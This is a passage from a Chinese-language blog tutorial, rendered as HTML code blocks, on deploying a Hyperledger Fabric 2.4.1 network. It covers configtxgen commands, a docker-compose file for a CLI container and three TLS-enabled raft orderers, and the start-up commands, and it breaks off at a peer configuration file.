class="hljs-attr">Organizations:</span><br>                <span class="hljs-bullet">-</span> <span class="hljs-meta">*OrdererOrg</span><br>            <span class="hljs-attr">Capabilities:</span><br>                <span class="hljs-string">&lt;&lt;:</span> <span class="hljs-meta">*OrdererCapabilities</span><br>        <span class="hljs-attr">Consortiums:</span><br>            <span class="hljs-attr">SampleConsortium:</span><br>                <span class="hljs-attr">Organizations:</span><br>                    <span class="hljs-bullet">-</span> <span class="hljs-meta">*Org1</span><br>                    <span class="hljs-bullet">-</span> <span class="hljs-meta">*Org2</span><br><br>    <span class="hljs-attr">TwoOrgsChannel:</span><br>        <span class="hljs-attr">Consortium:</span> <span class="hljs-string">SampleConsortium</span><br>        <span class="hljs-string">&lt;&lt;:</span> <span class="hljs-meta">*ChannelDefaults</span><br>        <span class="hljs-attr">Application:</span><br>            <span class="hljs-string">&lt;&lt;:</span> <span class="hljs-meta">*ApplicationDefaults</span><br>            <span class="hljs-attr">Organizations:</span><br>                <span class="hljs-bullet">-</span> <span class="hljs-meta">*Org1</span><br>                <span class="hljs-bullet">-</span> <span class="hljs-meta">*Org2</span><br>            <span class="hljs-attr">Capabilities:</span><br>                <span class="hljs-string">&lt;&lt;:</span> <span class="hljs-meta">*ApplicationCapabilities</span><br></code></pre></td></tr></table></figure><p>生成创世区块</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">.<span class="hljs-regexp">/configtxgen -configPath ../</span>config  -profile TwoOrgsOrdererGenesis -channelID fabric-channel -outputBlock ..<span class="hljs-regexp">/channel-artifacts/</span>orderer.genesis.block<br></code></pre></td></tr></table></figure><p>生成通道文件</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">.<span class="hljs-regexp">/configtxgen -configPath ../</span>config  -profile TwoOrgsChannel  -channelID businesschannel -outputCreateChannelTx ..<span class="hljs-regexp">/channel-artifacts/</span>businesschannel.tx<br></code></pre></td></tr></table></figure><p>生成锚节点配置更新文件</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">.<span class="hljs-regexp">/configtxgen -configPath ../</span>config  -profile TwoOrgsChannel -channelID businesschannel -asOrg Org1MSP -outputAnchorPeersUpdate ..<span class="hljs-regexp">/channel-artifacts/</span>Org1MSPanchors.tx<br><br>.<span class="hljs-regexp">/configtxgen -configPath ../</span>config  -profile TwoOrgsChannel -channelID businesschannel -asOrg Org2MSP -outputAnchorPeersUpdate ..<span class="hljs-regexp">/channel-artifacts/</span>Org2MSPanchors.tx<br></code></pre></td></tr></table></figure><h3 id="部署orderer节点"><a href="#部署orderer节点" class="headerlink" title="部署orderer节点"></a>部署orderer节点</h3><p>参考 <a href="https://github.com/yeasy/docker-compose-files/tree/master/hyperledger_fabri">docker-compose 文件</a></p><p>docker-compose-orderer.yaml（根据自己环境修改参数）</p><ul><li>extra_hosts</li><li>volumes</li></ul><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br></pre></td><td class="code"><pre><code class="hljs gradle">version: <span class="hljs-string">&#x27;2.0&#x27;</span><br><br>services:<br><br>    cli:<br>        image: hyperledger/fabric-tools:<span class="hljs-number">2.4</span>.<span class="hljs-number">1</span><br>        restart: always<br>        container_name: fabric-cli<br>        hostname: fabric-cli<br>        tty: <span class="hljs-keyword">true</span><br>        extra_hosts:<br>            - <span class="hljs-string">&quot;orderer0.example.com:192.168.177.128&quot;</span><br>            - <span class="hljs-string">&quot;orderer1.example.com:192.168.177.128&quot;</span><br>            - <span class="hljs-string">&quot;orderer2.example.com:192.168.177.128&quot;</span><br>            - <span class="hljs-string">&quot;peer0.org1.example.com:192.168.177.128&quot;</span><br>            - <span class="hljs-string">&quot;peer1.org1.example.com:192.168.177.128&quot;</span><br>            - <span class="hljs-string">&quot;peer0.org2.example.com:192.168.177.128&quot;</span><br>            - <span class="hljs-string">&quot;peer1.org2.example.com:192.168.177.128&quot;</span><br>        environment:<br>            - CORE_PEER_ID=fabric-cli<br>            - CORE_PEER_ADDRESS=peer0.org1.example.com:<span class="hljs-number">7051</span> # <span class="hljs-keyword">default</span> to operate on peer0.org1<br>            - CORE_PEER_LOCALMSPID=Org1MSP<br>            - CORE_PEER_TLS_CERT_FILE=<span class="hljs-regexp">/etc/</span>hyperledger<span class="hljs-regexp">/fabric/</span>crypto-config<span class="hljs-regexp">/peerOrganizations/</span>org1.example.com<span class="hljs-regexp">/peers/</span>peer0.org1.example.com<span class="hljs-regexp">/tls/</span>server.crt<br>            - CORE_PEER_TLS_KEY_FILE=<span class="hljs-regexp">/etc/</span>hyperledger<span class="hljs-regexp">/fabric/</span>crypto-config<span class="hljs-regexp">/peerOrganizations/</span>org1.example.com<span class="hljs-regexp">/peers/</span>peer0.org1.example.com<span class="hljs-regexp">/tls/</span>server.key<br>            - CORE_PEER_TLS_ROOTCERT_FILE=<span class="hljs-regexp">/etc/</span>hyperledger<span class="hljs-regexp">/fabric/</span>crypto-config<span class="hljs-regexp">/peerOrganizations/</span>org1.example.com<span class="hljs-regexp">/peers/</span>peer0.org1.example.com<span class="hljs-regexp">/tls/</span>ca.crt<br>            - CORE_PEER_MSPCONFIGPATH=<span class="hljs-regexp">/etc/</span>hyperledger<span class="hljs-regexp">/fabric/</span>crypto-config<span class="hljs-regexp">/peerOrganizations/</span>org1.example.com<span class="hljs-regexp">/users/</span>Admin@org1.example.com/msp<br>            - FABRIC_LOGGING_SPEC=DEBUG<br>            - FABRIC_LOGGING_FORMAT=%&#123;color&#125;[%&#123;id:<span class="hljs-number">03</span>x&#125; %&#123;time:<span class="hljs-number">01</span>-<span class="hljs-number">02</span> <span class="hljs-number">15</span>:<span class="hljs-number">04</span>:<span class="hljs-number">05.00</span> MST&#125;] [%&#123;module&#125;] %&#123;shortfunc&#125; -&gt; %&#123;level:.<span class="hljs-number">4</span>s&#125;%&#123;color:reset&#125; %&#123;message&#125;<br>            - CORE_PEER_TLS_ENABLED=<span class="hljs-keyword">true</span>  # to enable TLS, change to <span class="hljs-keyword">true</span><br>            - ORDERER_CA=<span class="hljs-regexp">/etc/</span>hyperledger<span class="hljs-regexp">/fabric/</span>crypto-config<span class="hljs-regexp">/ordererOrganizations/</span>example.com<span class="hljs-regexp">/orderers/</span>orderer0.example.com<span class="hljs-regexp">/msp/</span>tlscacerts/tlsca.example.com-cert.pem<br>        volumes:<br>            - ..<span class="hljs-regexp">/config/</span>crypto-config.yaml:<span class="hljs-regexp">/etc/</span>hyperledger<span class="hljs-regexp">/fabric/</span>crypto-config.yaml<br>            - ..<span class="hljs-regexp">/config/</span>configtx.yaml:<span class="hljs-regexp">/etc/</span>hyperledger<span class="hljs-regexp">/fabric/</span>configtx.yaml<br>            - ..<span class="hljs-regexp">/crypto-config:/</span>etc<span class="hljs-regexp">/hyperledger/</span>fabric/crypto-config<br>            - ..<span class="hljs-regexp">/channel-artifacts:/</span>tmp/channel-<span class="hljs-keyword">artifacts</span><br>            - ..<span class="hljs-regexp">/chaincodes:/</span>etc<span class="hljs-regexp">/hyperledger/</span>fabric/chaincodes<br>        working_dir: <span class="hljs-regexp">/opt/g</span>opath<span class="hljs-regexp">/src/gi</span>thub.com<span class="hljs-regexp">/hyperledger/</span>fabric/peer<br>        command: bash -c <span class="hljs-string">&#x27;cd /tmp; source scripts/func.sh; while true; do sleep 20170504; done&#x27;</span><br><br><br>    orderer0.example.com:  # There can be multiple orderers<br>        image: hyperledger/fabric-orderer:<span class="hljs-number">2.4</span>.<span class="hljs-number">1</span><br>        restart: always<br>        container_name: orderer0.example.com<br>        hostname: orderer0.example.com<br>        ports:<br>            - <span class="hljs-number">7050</span>:<span class="hljs-number">7050</span><br>            - <span class="hljs-number">8443</span>:<span class="hljs-number">8443</span><br>        extra_hosts:<br>            - <span class="hljs-string">&quot;orderer0.example.com:192.168.177.128&quot;</span><br>            - <span class="hljs-string">&quot;orderer1.example.com:192.168.177.128&quot;</span><br>            - <span class="hljs-string">&quot;orderer2.example.com:192.168.177.128&quot;</span><br>            - <span class="hljs-string">&quot;peer0.org1.example.com:192.168.177.128&quot;</span><br>            - <span class="hljs-string">&quot;peer1.org1.example.com:192.168.177.128&quot;</span><br>            - <span class="hljs-string">&quot;peer0.org2.example.com:192.168.177.128&quot;</span><br>            - <span class="hljs-string">&quot;peer1.org2.example.com:192.168.177.128&quot;</span><br>        environment:<br>            - FABRIC_LOGGING_FORMAT=<span class="hljs-string">&quot;%&#123;color&#125;%&#123;time:2006-01-02 15:04:05.000 MST&#125; [%&#123;module&#125;] %&#123;shortfunc&#125; -&gt; %&#123;level:.4s&#125; %&#123;id:03x&#125;%&#123;color:reset&#125; %&#123;message&#125;&quot;</span><br>            - ORDERER_GENERAL_LISTENADDRESS=<span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span> # <span class="hljs-keyword">default</span>: <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><br>            - ORDERER_GENERAL_LISTENPORT=<span class="hljs-number">7050</span><br>            - ORDERER_GENERAL_GENESISMETHOD=<span class="hljs-keyword">file</span> # <span class="hljs-keyword">default</span>: provisional<br>            - ORDERER_GENERAL_BOOTSTRAPFILE=<span class="hljs-regexp">/etc/</span>hyperledger<span class="hljs-regexp">/fabric/</span>orderer.genesis.block # by <span class="hljs-keyword">default</span>, all materials should be put under $FABRIC_CFG_PATH, which defaults to <span class="hljs-regexp">/etc/</span>hyperledger/fabric<br>            - ORDERER_GENERAL_LOCALMSPID=OrdererMSP # <span class="hljs-keyword">default</span>: <span class="hljs-keyword">DEFAULT</span><br>            - ORDERER_GENERAL_LOCALMSPDIR=<span class="hljs-regexp">/etc/</span>hyperledger<span class="hljs-regexp">/fabric/m</span>sp<br>            - ORDERER_GENERAL_LEDGERTYPE=<span class="hljs-keyword">file</span><br>            #- ORDERER_GENERAL_LEDGERTYPE=json  # <span class="hljs-keyword">default</span>: <span class="hljs-keyword">file</span><br>            - ORDERER_OPERATIONS_LISTENADDRESS=<span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span>:<span class="hljs-number">8443</span>  # operation RESTful API<br>            - ORDERER_METRICS_PROVIDER=prometheus  # prometheus will pull metrics <span class="hljs-keyword">from</span> orderer via /metrics RESTful API<br>            #- ORDERER_RAMLEDGER_HISTORY_SIZE=<span class="hljs-number">100</span>  #only useful when use ram ledger<br>            # enabled TLS<br>            - ORDERER_GENERAL_TLS_ENABLED=<span class="hljs-keyword">true</span> # <span class="hljs-keyword">default</span>: <span class="hljs-keyword">false</span><br>            - ORDERER_GENERAL_TLS_PRIVATEKEY=<span class="hljs-regexp">/etc/</span>hyperledger<span class="hljs-regexp">/fabric/</span>tls/server.key<br>            - ORDERER_GENERAL_TLS_CERTIFICATE=<span class="hljs-regexp">/etc/</span>hyperledger<span class="hljs-regexp">/fabric/</span>tls/server.crt<br>            - ORDERER_GENERAL_TLS_ROOTCAS=[<span class="hljs-regexp">/etc/</span>hyperledger<span class="hljs-regexp">/fabric/</span>tls/ca.crt]<br>            # Only required by raft mode<br>            - ORDERER_GENERAL_CLUSTER_CLIENTPRIVATEKEY=<span class="hljs-regexp">/etc/</span>hyperledger<span class="hljs-regexp">/fabric/</span>tls/server.key<br>            - ORDERER_GENERAL_CLUSTER_CLIENTCERTIFICATE=<span class="hljs-regexp">/etc/</span>hyperledger<span class="hljs-regexp">/fabric/</span>tls/server.crt<br>            - ORDERER_GENERAL_CLUSTER_ROOTCAS=[<span class="hljs-regexp">/etc/</span>hyperledger<span class="hljs-regexp">/fabric/</span>tls/ca.crt]<br>            - FABRIC_LOGGING_SPEC=DEBUG<br>        volumes:<br>            - ..<span class="hljs-regexp">/crypto-config/</span>ordererOrganizations<span class="hljs-regexp">/example.com/</span>orderers<span class="hljs-regexp">/orderer0.example.com/m</span>sp:<span class="hljs-regexp">/etc/</span>hyperledger<span class="hljs-regexp">/fabric/m</span>sp<br>            - ..<span class="hljs-regexp">/crypto-config/</span>ordererOrganizations<span class="hljs-regexp">/example.com/</span>orderers<span class="hljs-regexp">/orderer0.example.com/</span>tls<span class="hljs-regexp">/:/</span>etc<span class="hljs-regexp">/hyperledger/</span>fabric/tls<br>            - ..<span class="hljs-regexp">/channel-artifacts/</span>orderer.genesis.block:<span class="hljs-regexp">/etc/</span>hyperledger<span class="hljs-regexp">/fabric/</span>orderer.genesis.block<br>        expose:<br>            - <span class="hljs-string">&quot;7050&quot;</span>  # gRPC<br>            - <span class="hljs-string">&quot;8443&quot;</span>  # Operation REST<br>        command: orderer start<br><br>    orderer1.example.com:<br>        image: hyperledger/fabric-orderer:<span class="hljs-number">2.4</span>.<span class="hljs-number">1</span><br>        restart: always<br>        container_name: orderer1.example.com<br>        hostname: orderer1.example.com<br>        ports:<br>            - <span class="hljs-number">8050</span>:<span class="hljs-number">7050</span><br>            - <span class="hljs-number">8444</span>:<span class="hljs-number">8443</span><br>        extra_hosts:<br>            - <span class="hljs-string">&quot;orderer0.example.com:192.168.177.128&quot;</span><br>            - <span class="hljs-string">&quot;orderer1.example.com:192.168.177.128&quot;</span><br>            - <span class="hljs-string">&quot;orderer2.example.com:192.168.177.128&quot;</span><br>            - <span class="hljs-string">&quot;peer0.org1.example.com:192.168.177.128&quot;</span><br>            - <span class="hljs-string">&quot;peer1.org1.example.com:192.168.177.128&quot;</span><br>            - <span class="hljs-string">&quot;peer0.org2.example.com:192.168.177.128&quot;</span><br>            - <span class="hljs-string">&quot;peer1.org2.example.com:192.168.177.128&quot;</span><br>        environment:<br>            - FABRIC_LOGGING_SPEC=DEBUG<br>            - FABRIC_LOGGING_FORMAT=<span class="hljs-string">&quot;%&#123;color&#125;%&#123;time:2006-01-02 15:04:05.000 MST&#125; [%&#123;module&#125;] %&#123;shortfunc&#125; -&gt; %&#123;level:.4s&#125; %&#123;id:03x&#125;%&#123;color:reset&#125; %&#123;message&#125;&quot;</span><br>            - ORDERER_GENERAL_LISTENADDRESS=<span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span> # <span class="hljs-keyword">default</span>: <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><br>            - ORDERER_GENERAL_LISTENPORT=<span class="hljs-number">7050</span><br>            - ORDERER_GENERAL_GENESISMETHOD=<span class="hljs-keyword">file</span> # <span class="hljs-keyword">default</span>: provisional<br>            - ORDERER_GENERAL_BOOTSTRAPFILE=<span class="hljs-regexp">/etc/</span>hyperledger<span class="hljs-regexp">/fabric/</span>orderer.genesis.block # by <span class="hljs-keyword">default</span>, all materials should be put under $FABRIC_CFG_PATH, which defaults to <span class="hljs-regexp">/etc/</span>hyperledger/fabric<br>            - ORDERER_GENERAL_LOCALMSPID=OrdererMSP # <span class="hljs-keyword">default</span>: <span class="hljs-keyword">DEFAULT</span><br>            - ORDERER_GENERAL_LOCALMSPDIR=<span class="hljs-regexp">/etc/</span>hyperledger<span class="hljs-regexp">/fabric/m</span>sp<br>            - ORDERER_GENERAL_LEDGERTYPE=<span class="hljs-keyword">file</span><br>            #- ORDERER_GENERAL_LEDGERTYPE=json  # <span class="hljs-keyword">default</span>: <span class="hljs-keyword">file</span><br>            - ORDERER_OPERATIONS_LISTENADDRESS=<span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span>:<span class="hljs-number">8443</span>  # operation RESTful API<br>            - ORDERER_METRICS_PROVIDER=prometheus  # prometheus will pull metrics <span class="hljs-keyword">from</span> orderer via /metrics RESTful API<br>            #- ORDERER_RAMLEDGER_HISTORY_SIZE=<span class="hljs-number">100</span>  #only useful when use ram ledger<br>            # enabled TLS<br>            - ORDERER_GENERAL_TLS_ENABLED=<span class="hljs-keyword">true</span> # <span class="hljs-keyword">default</span>: <span class="hljs-keyword">false</span><br>            - ORDERER_GENERAL_TLS_PRIVATEKEY=<span class="hljs-regexp">/etc/</span>hyperledger<span class="hljs-regexp">/fabric/</span>tls/server.key<br>            - ORDERER_GENERAL_TLS_CERTIFICATE=<span class="hljs-regexp">/etc/</span>hyperledger<span class="hljs-regexp">/fabric/</span>tls/server.crt<br>            - ORDERER_GENERAL_TLS_ROOTCAS=[<span class="hljs-regexp">/etc/</span>hyperledger<span class="hljs-regexp">/fabric/</span>tls/ca.crt]<br>            # Only required by raft mode<br>            - ORDERER_GENERAL_CLUSTER_CLIENTPRIVATEKEY=<span class="hljs-regexp">/etc/</span>hyperledger<span class="hljs-regexp">/fabric/</span>tls/server.key<br>            - ORDERER_GENERAL_CLUSTER_CLIENTCERTIFICATE=<span class="hljs-regexp">/etc/</span>hyperledger<span class="hljs-regexp">/fabric/</span>tls/server.crt<br>            - ORDERER_GENERAL_CLUSTER_ROOTCAS=[<span class="hljs-regexp">/etc/</span>hyperledger<span class="hljs-regexp">/fabric/</span>tls/ca.crt]<br>            - ORDERER_GENERAL_CLUSTER_SENDBUFFERSIZE=<span class="hljs-number">10</span><br>        volumes:<br>            - ..<span class="hljs-regexp">/crypto-config/</span>ordererOrganizations<span class="hljs-regexp">/example.com/</span>orderers<span class="hljs-regexp">/orderer1.example.com/m</span>sp:<span class="hljs-regexp">/etc/</span>hyperledger<span class="hljs-regexp">/fabric/m</span>sp<br>            - ..<span class="hljs-regexp">/crypto-config/</span>ordererOrganizations<span class="hljs-regexp">/example.com/</span>orderers<span class="hljs-regexp">/orderer1.example.com/</span>tls<span class="hljs-regexp">/:/</span>etc<span class="hljs-regexp">/hyperledger/</span>fabric/tls<br>            - ..<span class="hljs-regexp">/channel-artifacts/</span>orderer.genesis.block:<span class="hljs-regexp">/etc/</span>hyperledger<span class="hljs-regexp">/fabric/</span>orderer.genesis.block<br>        command: orderer start    <br><br><br>    orderer2.example.com:<br>        image: hyperledger/fabric-orderer:<span class="hljs-number">2.4</span>.<span class="hljs-number">1</span><br>        restart: always<br>        container_name: orderer2.example.com<br>        hostname: orderer2.example.com<br>        ports:<br>            - <span class="hljs-number">9050</span>:<span class="hljs-number">7050</span><br>            - <span class="hljs-number">8445</span>:<span class="hljs-number">8443</span><br>        extra_hosts:<br>            - <span class="hljs-string">&quot;orderer0.example.com:192.168.177.128&quot;</span><br>            - <span class="hljs-string">&quot;orderer1.example.com:192.168.177.128&quot;</span><br>            - <span class="hljs-string">&quot;orderer2.example.com:192.168.177.128&quot;</span><br>            - <span class="hljs-string">&quot;peer0.org1.example.com:192.168.177.128&quot;</span><br>            - <span class="hljs-string">&quot;peer1.org1.example.com:192.168.177.128&quot;</span><br>            - <span class="hljs-string">&quot;peer0.org2.example.com:192.168.177.128&quot;</span><br>            - <span class="hljs-string">&quot;peer1.org2.example.com:192.168.177.128&quot;</span><br>        environment:<br>            - FABRIC_LOGGING_SPEC=DEBUG  # <span class="hljs-keyword">default</span>: INFO<br>            - FABRIC_LOGGING_FORMAT=<span class="hljs-string">&quot;%&#123;color&#125;%&#123;time:2006-01-02 15:04:05.000 MST&#125; [%&#123;module&#125;] %&#123;shortfunc&#125; -&gt; %&#123;level:.4s&#125; %&#123;id:03x&#125;%&#123;color:reset&#125; %&#123;message&#125;&quot;</span><br>            - ORDERER_GENERAL_LISTENADDRESS=<span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span> # <span class="hljs-keyword">default</span>: <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><br>            - ORDERER_GENERAL_LISTENPORT=<span class="hljs-number">7050</span><br>            - ORDERER_GENERAL_GENESISMETHOD=<span class="hljs-keyword">file</span> # <span class="hljs-keyword">default</span>: provisional<br>            - ORDERER_GENERAL_BOOTSTRAPFILE=<span class="hljs-regexp">/etc/</span>hyperledger<span class="hljs-regexp">/fabric/</span>orderer.genesis.block # by <span class="hljs-keyword">default</span>, all materials should be put under $FABRIC_CFG_PATH, which defaults to <span class="hljs-regexp">/etc/</span>hyperledger/fabric<br>            - ORDERER_GENERAL_LOCALMSPID=OrdererMSP # <span class="hljs-keyword">default</span>: <span class="hljs-keyword">DEFAULT</span><br>            - ORDERER_GENERAL_LOCALMSPDIR=<span class="hljs-regexp">/etc/</span>hyperledger<span class="hljs-regexp">/fabric/m</span>sp<br>            - ORDERER_GENERAL_LEDGERTYPE=<span class="hljs-keyword">file</span><br>            #- ORDERER_GENERAL_LEDGERTYPE=json  # <span class="hljs-keyword">default</span>: <span class="hljs-keyword">file</span><br>            - ORDERER_OPERATIONS_LISTENADDRESS=<span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span>:<span class="hljs-number">8443</span>  # operation RESTful API<br>            - ORDERER_METRICS_PROVIDER=prometheus  # prometheus will pull metrics <span class="hljs-keyword">from</span> orderer via /metrics RESTful API<br>            #- ORDERER_RAMLEDGER_HISTORY_SIZE=<span class="hljs-number">100</span>  #only useful when use ram ledger<br>            # enabled TLS<br>            - ORDERER_GENERAL_TLS_ENABLED=<span class="hljs-keyword">true</span> # <span class="hljs-keyword">default</span>: <span class="hljs-keyword">false</span><br>            - ORDERER_GENERAL_TLS_PRIVATEKEY=<span class="hljs-regexp">/etc/</span>hyperledger<span class="hljs-regexp">/fabric/</span>tls/server.key<br>            - ORDERER_GENERAL_TLS_CERTIFICATE=<span class="hljs-regexp">/etc/</span>hyperledger<span class="hljs-regexp">/fabric/</span>tls/server.crt<br>            - ORDERER_GENERAL_TLS_ROOTCAS=[<span class="hljs-regexp">/etc/</span>hyperledger<span class="hljs-regexp">/fabric/</span>tls/ca.crt]<br>            # Only required by raft mode<br>            - ORDERER_GENERAL_CLUSTER_CLIENTPRIVATEKEY=<span class="hljs-regexp">/etc/</span>hyperledger<span class="hljs-regexp">/fabric/</span>tls/server.key<br>            - ORDERER_GENERAL_CLUSTER_CLIENTCERTIFICATE=<span class="hljs-regexp">/etc/</span>hyperledger<span class="hljs-regexp">/fabric/</span>tls/server.crt<br>            - ORDERER_GENERAL_CLUSTER_ROOTCAS=[<span class="hljs-regexp">/etc/</span>hyperledger<span class="hljs-regexp">/fabric/</span>tls/ca.crt]<br>            - ORDERER_GENERAL_CLUSTER_SENDBUFFERSIZE=<span class="hljs-number">10</span><br>        volumes:<br>            - ..<span class="hljs-regexp">/crypto-config/</span>ordererOrganizations<span class="hljs-regexp">/example.com/</span>orderers<span class="hljs-regexp">/orderer2.example.com/m</span>sp:<span class="hljs-regexp">/etc/</span>hyperledger<span class="hljs-regexp">/fabric/m</span>sp<br>            - ..<span class="hljs-regexp">/crypto-config/</span>ordererOrganizations<span class="hljs-regexp">/example.com/</span>orderers<span class="hljs-regexp">/orderer2.example.com/</span>tls<span class="hljs-regexp">/:/</span>etc<span class="hljs-regexp">/hyperledger/</span>fabric/tls<br>            - ..<span class="hljs-regexp">/channel-artifacts/</span>orderer.genesis.block:<span class="hljs-regexp">/etc/</span>hyperledger<span class="hljs-regexp">/fabric/</span>orderer.genesis.block<br>        command: orderer start<br></code></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment">#启动服务</span><br>docker<span class="hljs-literal">-compose</span> <span class="hljs-operator">-f</span> docker<span class="hljs-literal">-compose</span><span class="hljs-literal">-orderer</span>.yaml up <span class="hljs-literal">-d</span><br><span class="hljs-comment">#停止服务并删除生成的文件</span><br>docker<span class="hljs-literal">-compose</span> <span class="hljs-operator">-f</span> docker<span class="hljs-literal">-compose</span><span class="hljs-literal">-3orderer</span>.yaml down <span class="hljs-literal">-v</span><br></code></pre></td></tr></table></figure><h3 id="部署org1-peer0节点"><a href="#部署org1-peer0节点" class="headerlink" title="部署org1-peer0节点"></a>部署org1-peer0节点</h3><p>docker-compose-org1-peer.yaml文件</p><figure class="highlight haml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span 